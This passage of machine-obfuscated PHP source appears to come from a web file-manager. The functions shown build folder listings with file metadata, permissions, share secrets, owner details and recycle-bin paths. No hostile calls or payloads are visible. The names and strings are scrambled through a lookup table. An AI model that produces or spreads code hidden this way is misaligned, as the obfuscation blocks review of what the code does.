$¶ÅœàÅë[$…‰ê­§[413]][$…‰ê­§[414]] = AuthModel::authDisable($¶ÅœàÅë[$…‰ê­§[413]][$…‰ê­§[414]], $¥ŠÆ×ğÑ); $¶ÅœàÅë[$…‰ê­§[413]][$…‰ê­§[467]][$…‰ê­§[413]] = $¶ÅœàÅë[$…‰ê­§[413]][$…‰ê­§[414]]; } } unset($¶ÅœàÅë); } protected function _listAppendFileMeta(&$ì¾š‘ÑÎ, $™’îÎ) { $è¹Ï†ßí =& $_SERVER[³·—™¤¢]; $±§á´é = array_to_keyvalue($ì¾š‘ÑÎ, $è¹Ï†ßí[12], $è¹Ï†ßí[468]); $±§á´é = array_filter(array_unique($±§á´é)); if (!$±§á´é) { return; } $ÏôÜÒµ = array($è¹Ï†ßí[469] => array($è¹Ï†ßí[418], $±§á´é)); $²ôÑ®ª = $è¹Ï†ßí[470]; $Ùïªôêä = Model($è¹Ï†ßí[471])->field($²ôÑ®ª)->where($ÏôÜÒµ)->select(); $Ùïªôêä = array_to_keyvalue($Ùïªôêä, $è¹Ï†ßí[468]); $­¼­Õ’’ = Model($è¹Ï†ßí[472])->field($è¹Ï†ßí[473])->where($ÏôÜÒµ)->select(); $­¼­Õ’’ = $­¼­Õ’’ ? $­¼­Õ’’ : array(); $´·»èÂı = array(); foreach ($­¼­Õ’’ as $×şĞûıÀ) { if (!isset($´·»èÂı[$×şĞûıÀ[$è¹Ï†ßí[468]]])) { $´·»èÂı[$×şĞûıÀ[$è¹Ï†ßí[468]]] = array(); } $´·»èÂı[$×şĞûıÀ[$è¹Ï†ßí[468]]][$×şĞûıÀ[$è¹Ï†ßí[94]]] = $×şĞûıÀ[$è¹Ï†ßí[374]]; } foreach ($ì¾š‘ÑÎ as &$úß‹‡Üî) { $¹áÑÏ = $úß‹‡Üî[$è¹Ï†ßí[468]]; if (!$¹áÑÏ || !is_array($Ùïªôêä[$¹áÑÏ])) { continue; } $·ÂëÍé¸ = $Ùïªôêä[$¹áÑÏ]; $·ÂëÍé¸[$è¹Ï†ßí[76]] = $úß‹‡Üî[$è¹Ï†ßí[76]]; $·ÂëÍé¸[$è¹Ï†ßí[32]] = $úß‹‡Üî[$è¹Ï†ßí[32]]; if (!isset(self::$cacheFileInfo[$è¹Ï†ßí[474] . $¹áÑÏ])) { self::$cacheFileInfo[$è¹Ï†ßí[474] . $¹áÑÏ] = array_merge(array(), $·ÂëÍé¸); } unset($Ùïªôêä[$¹áÑÏ][$è¹Ï†ßí[84]]); $–Ò¼ğÑ‘ = is_array($´·»èÂı[$¹áÑÏ]) ? $´·»èÂı[$¹áÑÏ] : array(); $úß‹‡Üî[$è¹Ï†ßí[170]] = array_merge($–Ò¼ğÑ‘, $Ùïªôêä[$¹áÑÏ]); if (isset($úß‹‡Üî[$è¹Ï†ßí[170]][$è¹Ï†ßí[169]])) { $úß‹‡Üî[$è¹Ï†ßí[169]] = json_decode($úß‹‡Üî[$è¹Ï†ßí[170]][$è¹Ï†ßí[169]], !0); unset($úß‹‡Üî[$è¹Ï†ßí[170]][$è¹Ï†ßí[169]]); } } unset($úß‹‡Üî); } protected function _listAppendSourceInfo(&$˜³‚·©†, $¢§‘Ï) { $ƒş£îÓ‡ =& $_SERVER[³·—™¤¢]; if (!defined($ƒş£îÓ‡[475])) { return; } $óî›¯¸— = Model($ƒş£îÓ‡[476])->listData(); $àºº¨Ÿ = Model($ƒş£îÓ‡[425])->listData(); $ƒÑ¬î÷æ = Model($ƒş£îÓ‡[415])->listData(); $·×„ïé = Model($ƒş£îÓ‡[477])->listSimple(); $­¦ö°» = array_to_keyvalue($óî›¯¸—, $ƒş£îÓ‡[399]); $Äûù‰›ô = array_to_keyvalue_group($àºº¨Ÿ, $ƒş£îÓ‡[84], $ƒş£îÓ‡[426]); $É¢ª”‚™ = array_to_keyvalue($ƒÑ¬î÷æ, $ƒş£îÓ‡[84]); $ù£›øÔ = array_to_keyvalue_group($·×„ïé, $ƒş£îÓ‡[402]); foreach ($˜³‚·©† as &$›É°—è¶) { $›É°—è¶[$ƒş£îÓ‡[86]] = array($ƒş£îÓ‡[478] => 0, $ƒş£îÓ‡[479] => 0, $ƒş£îÓ‡[480] => 0); if (isset($É¢ª”‚™[$›É°—è¶[$ƒş£îÓ‡[402]]])) { $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[481]] = 1; $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[482]] = $É¢ª”‚™[$›É°—è¶[$ƒş£îÓ‡[402]]][$ƒş£îÓ‡[32]]; } if ($Äûù‰›ô && $­¦ö°» && isset($Äûù‰›ô[$›É°—è¶[$ƒş£îÓ‡[402]]])) { $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[483]] = array(); foreach ($Äûù‰›ô[$›É°—è¶[$ƒş£îÓ‡[402]]] as $„¾ÓáàÖ) { $—áÒ•ã = $­¦ö°»[$„¾ÓáàÖ]; $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[483]][] = array($ƒş£îÓ‡[484] => $—áÒ•ã[$ƒş£îÓ‡[399]], $ƒş£îÓ‡[420] => $—áÒ•ã[$ƒş£îÓ‡[32]], $ƒş£îÓ‡[485] => $—áÒ•ã[$ƒş£îÓ‡[486]]); } } if ($ù£›øÔ && isset($ù£›øÔ[$›É°—è¶[$ƒş£îÓ‡[402]]])) { $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[487]] = array(); foreach ($ù£›øÔ[$›É°—è¶[$ƒş£îÓ‡[402]]] as $µ£îŸ¢Ü) { $›É°—è¶[$ƒş£îÓ‡[86]][$ƒş£îÓ‡[487]] = array($ƒş£îÓ‡[488] => $µ£îŸ¢Ü[$ƒş£îÓ‡[489]], $ƒş£îÓ‡[490] => $µ£îŸ¢Ü[$ƒş£îÓ‡[491]], $ƒş£îÓ‡[492] => $µ£îŸ¢Ü[$ƒş£îÓ‡[402]], $ƒş£îÓ‡[493] => $µ£îŸ¢Ü[$ƒş£îÓ‡[494]], $ƒş£îÓ‡[495] => $µ£îŸ¢Ü[$ƒş£îÓ‡[496]], $ƒş£îÓ‡[497] => $µ£îŸ¢Ü[$ƒş£îÓ‡[497]], $ƒş£îÓ‡[498] => $µ£îŸ¢Ü[$ƒş£îÓ‡[498]]); } } } unset($›É°—è¶); return $˜³‚·©†; } protected function _listAppendChildren(&$ğéì´Ã°, $é¦Ø–î) { $Èñ‚Ş§¼ =& $_SERVER[³·—™¤¢]; $È²ªşÍ = array(); $Ò¶š¯°Ö = array($Èñ‚Ş§¼[207] => 0, $Èñ‚Ş§¼[208] => 0); foreach ($ğéì´Ã° as &$Á±Ú¾ï) { if (!$Á±Ú¾ï[$Èñ‚Ş§¼[410]]) { continue; } $È²ªşÍ[] = $Á±Ú¾ï[$Èñ‚Ş§¼[402]]; } unset($Á±Ú¾ï); if (!$È²ªşÍ) { return; } $£±Ãªä× = array($Èñ‚Ş§¼[432] => array($Èñ‚Ş§¼[7], $È²ªşÍ), $Èñ‚Ş§¼[431] => 0); $¬‚™ÕÌÛ = array($Èñ‚Ş§¼[432], $Èñ‚Ş§¼[410], $Èñ‚Ş§¼[499] => $Èñ‚Ş§¼[500]); $ùİ°‡…û = $this->field($¬‚™ÕÌÛ)->where($£±Ãªä×)->group($Èñ‚Ş§¼[501])->select(); $·‰¸·’ = array(); foreach ($ùİ°‡…û as $¶ä¡¶ù‰) { $–×˜ÒŸî = $¶ä¡¶ù‰[$Èñ‚Ş§¼[432]]; $§¬­ìß´ = $¶ä¡¶ù‰[$Èñ‚Ş§¼[410]] == $Èñ‚Ş§¼[88] ? $Èñ‚Ş§¼[208] : $Èñ‚Ş§¼[207]; if (!isset($·‰¸·’[$–×˜ÒŸî])) { $·‰¸·’[$–×˜ÒŸî] = array($Èñ‚Ş§¼[207] => 0, $Èñ‚Ş§¼[208] => 0); } $·‰¸·’[$–×˜ÒŸî][$§¬­ìß´] += $¶ä¡¶ù‰[$Èñ‚Ş§¼[500]]; } foreach ($ğéì´Ã° as &$Á±Ú¾ï) { if (!$Á±Ú¾ï[$Èñ‚Ş§¼[410]]) { continue; } $ü¹é•Ã = is_array($·‰¸·’[$Á±Ú¾ï[$Èñ‚Ş§¼[402]]]) ? $·‰¸·’[$Á±Ú¾ï[$Èñ‚Ş§¼[402]]] : $Ò¶š¯°Ö; $Á±Ú¾ï[$Èñ‚Ş§¼[208]] = $ü¹é•Ã[$Èñ‚Ş§¼[208]]; $Á±Ú¾ï[$Èñ‚Ş§¼[207]] = $ü¹é•Ã[$Èñ‚Ş§¼[207]]; unset($Á±Ú¾ï[$Èñ‚Ş§¼[412]]); } unset($Á±Ú¾ï); } protected function _listAppendAuth(&$ÚÜ¶‡ˆ) { $ó¬É§ =& $_SERVER[³·—™¤¢]; if (!defined($ó¬É§[475])) { return; } $§©ÌÇÉ¿ = array(); foreach ($ÚÜ¶‡ˆ as $¤­…Ù€) { if ($¤­…Ù€[$ó¬É§[411]] == self::TYPE_GROUP) { $§©ÌÇÉ¿[] = $¤­…Ù€[$ó¬É§[402]]; } } if (!$§©ÌÇÉ¿) { return; } $ç¢¸éåæ = array_to_keyvalue($ÚÜ¶‡ˆ, $ó¬É§[402]); $×ñ÷ÙçÔ = Model($ó¬É§[502])->getSourceList($§©ÌÇÉ¿, $ç¢¸éåæ); $ŸÂš×Ğ÷ = $GLOBALS[$ó¬É§[503]] == 1; foreach ($ÚÜ¶‡ˆ as $Ïß†½» => &$¤­…Ù€) { $¤­…Ù€[$ó¬É§[413]] = $×ñ÷ÙçÔ[$¤­…Ù€[$ó¬É§[402]]]; if (!$¤­…Ù€[$ó¬É§[413]] && $¤­…Ù€[$ó¬É§[411]] == self::TYPE_GROUP) { $¤­…Ù€[$ó¬É§[413]] = Action($ó¬É§[504])->pathGroupAuthMake($¤­…Ù€[$ó¬É§[505]]); if (!$¤­…Ù€[$ó¬É§[413]] && !$ŸÂš×Ğ÷) { $¤­…Ù€[$ó¬É§[202]] = !1; $¤­…Ù€[$ó¬É§[201]] = !1; } } if ($¤­…Ù€[$ó¬É§[413]]) { $¤­…Ù€[$ó¬É§[202]] = AuthModel::authCheckEdit($¤­…Ù€[$ó¬É§[413]][$ó¬É§[414]]); $¤­…Ù€[$ó¬É§[201]] = AuthModel::authCheckView($¤­…Ù€[$ó¬É§[413]][$ó¬É§[414]]); } $this->groupPathDisplay($¤­…Ù€); } unset($¤­…Ù€); } public function _listAppendAuthSecret(&$©®±ºš) { $¹…‘Ù­ =& $_SERVER[³·—™¤¢]; if (Model($¹…‘Ù­[435])->get($¹…‘Ù­[506]) != $¹…‘Ù­[88]) { return; } static $¡¤×ôê = false; if (!$¡¤×ôê) { $ò·¤ì…ƒ = Model($¹…‘Ù­[507]); $¿©¿ĞÕ‘ = Model($¹…‘Ù­[508]); $¡¤×ôê = $¿©¿ĞÕ‘->listData(); $¡¤×ôê = array_to_keyvalue($¡¤×ôê, $¹…‘Ù­[402]); $‹»¶¾ˆâ = json_decode(Model($¹…‘Ù­[435])->get($¹…‘Ù­[509]), !0); $‹»¶¾ˆâ = array_to_keyvalue($‹»¶¾ˆâ, $¹…‘Ù­[399]); foreach ($¡¤×ôê as $˜ê³¸ò => $£Ì¼Óà) { $ÜõıÒ¾à = $‹»¶¾ˆâ[$£Ì¼Óà[$¹…‘Ù­[510]]]; if (!$ÜõıÒ¾à) { $¿©¿ĞÕ‘->remove($£Ì¼Óà[$¹…‘Ù­[399]]); unset($¡¤×ôê[$˜ê³¸ò]); continue; } $ë¡‹Ù¥İ = $ò·¤ì…ƒ->listData($ÜõıÒ¾à[$¹…‘Ù­[413]]); if (!$ë¡‹Ù¥İ) { $¿©¿ĞÕ‘->remove($£Ì¼Óà[$¹…‘Ù­[399]]); unset($¡¤×ôê[$˜ê³¸ò]); continue; } $£Ì¼Óà[$¹…‘Ù­[413]] = $ë¡‹Ù¥İ; $£Ì¼Óà[$¹…‘Ù­[511]] = $ÜõıÒ¾à; $£Ì¼Óà[$¹…‘Ù­[512]] = Model($¹…‘Ù­[513])->getInfoSimpleOuter($£Ì¼Óà[$¹…‘Ù­[454]]); $¡¤×ôê[$˜ê³¸ò] = $£Ì¼Óà; } } $Ñ§¼ˆÀÎ = defined($¹…‘Ù­[514]) ? USER_ID : $¹…‘Ù­[12]; $Û´íªğ³ = array(); $ªûşïş = $this->_listAppendPath($Û´íªğ³, !0); foreach ($©®±ºš as $˜ê³¸ò => &$£Ì¼Óà) { if (!is_array($£Ì¼Óà[$¹…‘Ù­[413]])) { continue; } if ($£Ì¼Óà[$¹…‘Ù­[411]] != $¹…‘Ù­[515]) { continue; } if (isset($¡¤×ôê[$£Ì¼Óà[$¹…‘Ù­[402]]])) { $Ó¤©¶€ = $¡¤×ôê[$£Ì¼Óà[$¹…‘Ù­[402]]]; if (!is_array($£Ì¼Óà[$¹…‘Ù­[466]])) { $£Ì¼Óà[$¹…‘Ù­[466]] = array(); } $£Ì¼Óà[$¹…‘Ù­[466]][$¹…‘Ù­[516]] = $Ó¤©¶€[$¹…‘Ù­[510]]; $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[517]] = $Ó¤©¶€; $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[518]] = $£Ì¼Óà[$¹…‘Ù­[519]]; $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[520]] = $¹…‘Ù­[88]; if ($Ó¤©¶€[$¹…‘Ù­[454]] != $Ñ§¼ˆÀÎ) { $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[414]] = $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[414]] & $Ó¤©¶€[$¹…‘Ù­[413]][$¹…‘Ù­[413]]; } continue; } $òü”…‰ô = $this->parentLevelArray($£Ì¼Óà[$¹…‘Ù­[521]]); $Á¢ÎŠÊï = array_reverse($òü”…‰ô); foreach ($Á¢ÎŠÊï as $¾ä…ª²À => $ÊËÎá£) { if (!isset($¡¤×ôê[$ÊËÎá£])) { continue; } $Ó¤©¶€ = $¡¤×ôê[$ÊËÎá£]; $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[517]] = $Ó¤©¶€; if ($Ó¤©¶€[$¹…‘Ù­[454]] != $Ñ§¼ˆÀÎ) { $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[414]] = $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[414]] & $Ó¤©¶€[$¹…‘Ù­[413]][$¹…‘Ù­[413]]; } $À¥¼Ê = $¹…‘Ù­[12]; $§­«û²Î = count($òü”…‰ô) - $¾ä…ª²À; for ($æ˜µ¢‚ô = 0; $æ˜µ¢‚ô < $§­«û²Î; $æ˜µ¢‚ô++) { if (!isset($ªûşïş[$òü”…‰ô[$æ˜µ¢‚ô]])) { $À¥¼Ê = $¹…‘Ù­[12]; break; } $À¥¼Ê = $À¥¼Ê . rtrim($ªûşïş[$òü”…‰ô[$æ˜µ¢‚ô]], $¹…‘Ù­[8]) . $¹…‘Ù­[8]; } $£Ì¼Óà[$¹…‘Ù­[413]][$¹…‘Ù­[518]] = rtrim($À¥¼Ê, $¹…‘Ù­[8]) . $¹…‘Ù­[8]; break; } } unset($£Ì¼Óà); } public function groupPathDisplay(&$ëÛêßÓ) { $á³¸âÃ =& $_SERVER[³·—™¤¢]; if ($ëÛêßÓ[$á³¸âÃ[411]] != self::TYPE_GROUP) { return; } $¸üè×”­ = Model($á³¸âÃ[522])->getInfo($ëÛêßÓ[$á³¸âÃ[505]]); $Á“¡™ = $this->parentLevelArray($¸üè×”­[$á³¸âÃ[521]]); $»ëëµû® = $á³¸âÃ[12]; foreach ($Á“¡™ as $Ğ›ÀŞÜÊ) { $Öºê³ÙÓ = Model($á³¸âÃ[522])->getInfo($Ğ›ÀŞÜÊ); $»ëëµû® .= $Öºê³ÙÓ[$á³¸âÃ[86]][$á³¸âÃ[402]] . $á³¸âÃ[50]; } $ëÛêßÓ[$á³¸âÃ[523]] = $¸üè×”­[$á³¸âÃ[432]]; $ëÛêßÓ[$á³¸âÃ[524]] = $¸üè×”­[$á³¸âÃ[521]]; $ëÛêßÓ[$á³¸âÃ[525]] = $¸üè×”­[$á³¸âÃ[526]]; $ëÛêßÓ[$á³¸âÃ[527]] = $»ëëµû® . $¸üè×”­[$á³¸âÃ[86]][$á³¸âÃ[402]]; } protected function _listAppendPath(&$ƒÁ³ë¿, $Ğáî»Õ¥ = false) { $ÂŒ½…éò =& $_SERVER[³·—™¤¢]; static $«“ö ö÷ = array(); $ËƒØ¬÷ = array(); $×“øÏšá = array(); if ($Ğáî»Õ¥) { return $«“ö ö÷; } foreach ($ƒÁ³ë¿ as &$ËÙÜğ…Ù) { $ˆÉ¨İ°½ = $ËÙÜğ…Ù[$ÂŒ½…éò[402]]; if ($ËÙÜğ…Ù[$ÂŒ½…éò[410]] == $ÂŒ½…éò[88] && $ËÙÜğ…Ù[$ÂŒ½…éò[432]] != 0) { $«“ö ö÷[$ˆÉ¨İ°½] = $ËÙÜğ…Ù[$ÂŒ½…éò[32]]; } if ($ËÙÜğ…Ù[$ÂŒ½…éò[410]] == $ÂŒ½…éò[88] && $ËÙÜğ…Ù[$ÂŒ½…éò[432]] == 0 && !isset($«“ö ö÷[$ˆÉ¨İ°½])) { $«“ö ö÷[$ˆÉ¨İ°½] = $this->_listAppendPathRoot($ËÙÜğ…Ù, array()); } if (isset($×“øÏšá[$ËÙÜğ…Ù[$ÂŒ½…éò[521]]])) { continue; } $×“øÏšá[$ËÙÜğ…Ù[$ÂŒ½…éò[521]]] = !0; $¹òıî‡Ş = $this->parentLevelArray($ËÙÜğ…Ù[$ÂŒ½…éò[521]]); foreach ($¹òıî‡Ş as $Ôàû·¯ => $íØÕ¾Ô‘) { if (isset($«“ö ö÷[$íØÕ¾Ô‘])) { continue; } if ($Ôàû·¯ == 0) { $«“ö ö÷[$íØÕ¾Ô‘] = $this->_listAppendPathRoot($ËÙÜğ…Ù, $¹òıî‡Ş); } if ($Ôàû·¯ != 0) { $ËƒØ¬÷[] = $íØÕ¾Ô‘; } } } unset($ËÙÜğ…Ù); $ËƒØ¬÷ = array_unique($ËƒØ¬÷); if (count($ËƒØ¬÷) > 0) { $½ÆÉá²‹ = array($ÂŒ½…éò[417] => array($ÂŒ½…éò[418], $ËƒØ¬÷)); if (count($ËƒØ¬÷) == 1) { $‹Í³»æ‘ = $this->sourceInfo($ËƒØ¬÷[0]); $µŸˆ‰ = is_array($‹Í³»æ‘) ? array($‹Í³»æ‘) : !1; } else { $µŸˆ‰ = $this->field($ÂŒ½…éò[528])->where($½ÆÉá²‹)->select(); } if (!$µŸˆ‰) { $µŸˆ‰ = array(); } foreach ($µŸˆ‰ as $£¢ı”‹™) { $«“ö ö÷[$£¢ı”‹™[$ÂŒ½…éò[402]]] = $£¢ı”‹™[$ÂŒ½…éò[32]]; } } $¨« —àã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $©êÆ—ãÀ = array(); foreach ($ƒÁ³ë¿ as &$ËÙÜğ…Ù) { $–Òç²õ = $ËÙÜğ…Ù[$ÂŒ½…éò[521]]; $…èÂìÀÊ = $ÂŒ½…éò[12]; if (isset($©êÆ—ãÀ[$–Òç²õ])) { $…èÂìÀÊ = $©êÆ—ãÀ[$–Òç²õ]; } else { $¹òıî‡Ş = $this->parentLevelArray($ËÙÜğ…Ù[$ÂŒ½…éò[521]]); foreach ($¹òıî‡Ş as $Ôàû·¯ => $íØÕ¾Ô‘) { if (isset($«“ö ö÷[$íØÕ¾Ô‘])) { $…èÂìÀÊ .= $«“ö ö÷[$íØÕ¾Ô‘] . $ÂŒ½…éò[8]; } } $©êÆ—ãÀ[$–Òç²õ] = $…èÂìÀÊ; } $…èÂìÀÊ .= $ËÙÜğ…Ù[$ÂŒ½…éò[32]]; if ($ËÙÜğ…Ù[$ÂŒ½…éò[410]] == $ÂŒ½…éò[88]) { $…èÂìÀÊ .= $ÂŒ½…éò[8]; } $ËÙÜğ…Ù[$ÂŒ½…éò[519]] = str_replace($ÂŒ½…éò[529], $ÂŒ½…éò[8], $…èÂìÀÊ); if ($ËÙÜğ…Ù[$ÂŒ½…éò[432]] == $ÂŒ½…éò[197]) { $ËÙÜğ…Ù[$ÂŒ½…éò[32]] = trim($«“ö ö÷[$ËÙÜğ…Ù[$ÂŒ½…éò[402]]], $ÂŒ½…éò[8]); $ËÙÜğ…Ù[$ÂŒ½…éò[519]] = $ËÙÜğ…Ù[$ÂŒ½…éò[32]] . $ÂŒ½…éò[8]; } if (intval($ËÙÜğ…Ù[$ÂŒ½…éò[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ËÙÜğ…Ù, $¹òıî‡Ş, $¨« —àã); } } unset($ËÙÜğ…Ù); return $ƒÁ³ë¿; } private function _listAppendPathRecycle(&$š÷ÒÌÙ, $î©ëôª¡, $é½ø›Áê) { $¾Ã‰¸¬ =& $_SERVER[³·—™¤¢]; if (!in_array($é½ø›Áê, $î©ëôª¡) && $š÷ÒÌÙ[$¾Ã‰¸¬[402]] != $é½ø›Áê) { return; } $óÔåóİë = explode($¾Ã‰¸¬[8], trim($š÷ÒÌÙ[$¾Ã‰¸¬[519]], $¾Ã‰¸¬[8])); $³êñÍ†¥ = implode($¾Ã‰¸¬[8], array_slice($óÔåóİë, 2)); $š÷ÒÌÙ[$¾Ã‰¸¬[519]] = $¾Ã‰¸¬[8] . LNG($¾Ã‰¸¬[530]) . $¾Ã‰¸¬[8] . ltrim($³êñÍ†¥, $¾Ã‰¸¬[8]); $š÷ÒÌÙ[$¾Ã‰¸¬[521]] = $¾Ã‰¸¬[531] . implode($¾Ã‰¸¬[50], array_slice($î©ëôª¡, 1)) . $¾Ã‰¸¬[50]; if ($š÷ÒÌÙ[$¾Ã‰¸¬[402]] == $é½ø›Áê) { $š÷ÒÌÙ[$¾Ã‰¸¬[521]] = $¾Ã‰¸¬[531]; $š÷ÒÌÙ[$¾Ã‰¸¬[432]] = $¾Ã‰¸¬[197]; $š÷ÒÌÙ[$¾Ã‰¸¬[32]] = LNG($¾Ã‰¸¬[530]); } $š÷ÒÌÙ[$¾Ã‰¸¬[532]] = $¾Ã‰¸¬[533]; } protected function _listAppendPathRoot(&$ªŠ¿ı•‰, $à˜³„¾Ä) { $ûÄ–ÀË =& $_SERVER[³·—™¤¢]; static $ÎÚ´î = false; $¤ŒéÒíÌ = $ûÄ–ÀË[12]; if ($ªŠ¿ı•‰[$ûÄ–ÀË[411]] == self::TYPE_USER) { if (defined($ûÄ–ÀË[475]) && $ªŠ¿ı•‰[$ûÄ–ÀË[505]] == USER_ID) { $¤ŒéÒíÌ = LNG($ûÄ–ÀË[534]); if ($ÎÚ´î === !1) { $€ĞĞ¬ğß = Model($ûÄ–ÀË[535])->getInfoFull(USER_ID); $ÎÚ´î = _get($€ĞĞ¬ğß, $ûÄ–ÀË[536], $ûÄ–ÀË[12]); } if ($à˜³„¾Ä && $à˜³„¾Ä[0] == $ÎÚ´î || !$à˜³„¾Ä && $ªŠ¿ı•‰[$ûÄ–ÀË[402]] == $ÎÚ´î) { $¤ŒéÒíÌ = LNG($ûÄ–ÀË[537]); $ªŠ¿ı•‰[$ûÄ–ÀË[538]] = $ûÄ–ÀË[539]; } if (!$à˜³„¾Ä) { $ªŠ¿ı•‰[$ûÄ–ÀË[32]] = $¤ŒéÒíÌ; } } else { $ëÑå´ü° = Model($ûÄ–ÀË[513])->getInfoSimple($ªŠ¿ı•‰[$ûÄ–ÀË[505]]); $¤ŒéÒíÌ = LNG($ûÄ–ÀË[540]) . $ûÄ–ÀË[162] . $ëÑå´ü°[$ûÄ–ÀË[32]] . $ûÄ–ÀË[164]; $ªŠ¿ı•‰[$ûÄ–ÀË[541]] = array($ûÄ–ÀË[32] => $ëÑå´ü°[$ûÄ–ÀË[32]], $ûÄ–ÀË[542] => $ëÑå´ü°[$ûÄ–ÀË[542]], $ûÄ–ÀË[543] => $ëÑå´ü°[$ûÄ–ÀË[543]]); } } else { if ($ªŠ¿ı•‰[$ûÄ–ÀË[411]] == self::TYPE_GROUP) { $ëÑå´ü° = Model($ûÄ–ÀË[522])->getInfoSimple($ªŠ¿ı•‰[$ûÄ–ÀË[505]]); $¤ŒéÒíÌ = $ëÑå´ü°[$ûÄ–ÀË[32]]; } else { if ($ªŠ¿ı•‰[$ûÄ–ÀË[411]] == self::TYPE_SYSTEM) { $¤ŒéÒíÌ = $ûÄ–ÀË[544]; } } } $¤ŒéÒíÌ = $¤ŒéÒíÌ ? $ûÄ–ÀË[8] . $¤ŒéÒíÌ . $ûÄ–ÀË[8] : $ûÄ–ÀË[8]; return $¤ŒéÒíÌ; } protected function _listAppendUser(&$ºÓÉùÚ¼) { $ø”ÂÖ½ˆ =& $_SERVER[³·—™¤¢]; $©íø·µì = array_to_keyvalue($ºÓÉùÚ¼, $ø”ÂÖ½ˆ[12], $ø”ÂÖ½ˆ[454]); $¡µ³°Œ = array_to_keyvalue($ºÓÉùÚ¼, $ø”ÂÖ½ˆ[12], $ø”ÂÖ½ˆ[456]); $Á¥Ùë—ˆ = array_merge($©íø·µì, $¡µ³°Œ); $ÓˆÊ½¬„ = Model($ø”ÂÖ½ˆ[535])->userListInfo($Á¥Ùë—ˆ); foreach ($ºÓÉùÚ¼ as &$ÈËº…Ä) { $ÜÙªÓ©Î = $ÈËº…Ä[$ø”ÂÖ½ˆ[454]]; $ÈËº…Ä[$ø”ÂÖ½ˆ[454]] = $ÓˆÊ½¬„[$ÜÙªÓ©Î] ? $ÓˆÊ½¬„[$ÜÙªÓ©Î] : !1; $ÜÙªÓ©Î = $ÈËº…Ä[$ø”ÂÖ½ˆ[456]]; $ÈËº…Ä[$ø”ÂÖ½ˆ[456]] = $ÓˆÊ½¬„[$ÜÙªÓ©Î] ? $ÓˆÊ½¬„[$ÜÙªÓ©Î] : !1; if (isset($ÈËº…Ä[$ø”ÂÖ½ˆ[466]]) && $ÈËº…Ä[$ø”ÂÖ½ˆ[466]][$ø”ÂÖ½ˆ[545]]) { $çÜŠ—¿ì = $GLOBALS[$ø”ÂÖ½ˆ[6]][$ø”ÂÖ½ˆ[89]][$ø”ÂÖ½ˆ[546]]; if ($ÈËº…Ä[$ø”ÂÖ½ˆ[466]][$ø”ÂÖ½ˆ[547]] <= time() - $çÜŠ—¿ì) { $this->metaSet($ÈËº…Ä[$ø”ÂÖ½ˆ[402]], $ø”ÂÖ½ˆ[545], null); $this->metaSet($ÈËº…Ä[$ø”ÂÖ½ˆ[402]], $ø”ÂÖ½ˆ[547], null); unset($ÈËº…Ä[$ø”ÂÖ½ˆ[466]][$ø”ÂÖ½ˆ[545]]); continue; } $‰™Â€»Õ = $ÈËº…Ä[$ø”ÂÖ½ˆ[466]][$ø”ÂÖ½ˆ[545]]; $ÈËº…Ä[$ø”ÂÖ½ˆ[466]][$ø”ÂÖ½ˆ[548]] = Model($ø”ÂÖ½ˆ[535])->getInfoSimpleOuter($‰™Â€»Õ); } } unset($ÈËº…Ä); } public function parentLevelArray($æÈ¤¶•) { $ôØë»«ª =& $_SERVER[³·—™¤¢]; $æÈ¤¶• = explode($ôØë»«ª[50], trim($æÈ¤¶•, $ôØë»«ª[50])); return array_remove_value($æÈ¤¶•, $ôØë»«ª[197]); } public function listAll($†ÚˆĞìÃ) { $åÒ“¡€ñ =& $_SERVER[³·—™¤¢]; $Ä®…Ÿçû = $this->sourceInfo($†ÚˆĞìÃ); $²´£ù®Õ = array($åÒ“¡€ñ[549] => array($åÒ“¡€ñ[550], $Ä®…Ÿçû[$åÒ“¡€ñ[521]] . $†ÚˆĞìÃ . $åÒ“¡€ñ[551]), $åÒ“¡€ñ[552] => 0); $ÒâÅ “Â = $åÒ“¡€ñ[553]; $á´ºˆÆ¥ = "\114\105\106\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x69\157\x5f\146\x69\x6c\x65\x20\x66\x69\x6c\145\x20\157\156\x20\x73\x6f\165\162\x63\145\56\146\x69\154\145\111\104\40\x3d\x20\146\151\154\145\56\146\x69\x6c\x65\111\104"; $®¾ºÛš = $this->alias($åÒ“¡€ñ[446])->field($ÒâÅ “Â)->where($²´£ù®Õ)->join($á´ºˆÆ¥)->select(); $this->_listAppendAuth($®¾ºÛš); $this->_listAppendUser($®¾ºÛš); $this->_listAppendPath($®¾ºÛš); $®¾ºÛš = array_to_keyvalue($®¾ºÛš, $åÒ“¡€ñ[402]); $îŞŸ¯Ã = "\57{$Ä®…Ÿçû[$åÒ“¡€ñ[32]]}\x2f"; $îŞŸ¯Ã = $îŞŸ¯Ã == $åÒ“¡€ñ[529] ? $åÒ“¡€ñ[8] : $îŞŸ¯Ã; $ığŒªŞâ = array(); foreach ($®¾ºÛš as $øñô‘€Ä => $±­ˆêİ§) { $ûÄßÏ÷¾ = $this->parentLevelArray($±­ˆêİ§[$åÒ“¡€ñ[521]]); array_shift($ûÄßÏ÷¾); $˜®œîÂÌ = $îŞŸ¯Ã; for ($¹ŠğÒÀ¶ = 0; $¹ŠğÒÀ¶ < count($ûÄßÏ÷¾); $¹ŠğÒÀ¶++) { $˜®œîÂÌ .= $®¾ºÛš[$ûÄßÏ÷¾[$¹ŠğÒÀ¶]][$åÒ“¡€ñ[32]] . $åÒ“¡€ñ[8]; } $˜®œîÂÌ .= $±­ˆêİ§[$åÒ“¡€ñ[32]]; if ($±­ˆêİ§[$åÒ“¡€ñ[410]]) { $˜®œîÂÌ .= $åÒ“¡€ñ[8]; } $˜®œîÂÌ = str_replace($åÒ“¡€ñ[529], $åÒ“¡€ñ[8], $˜®œîÂÌ); 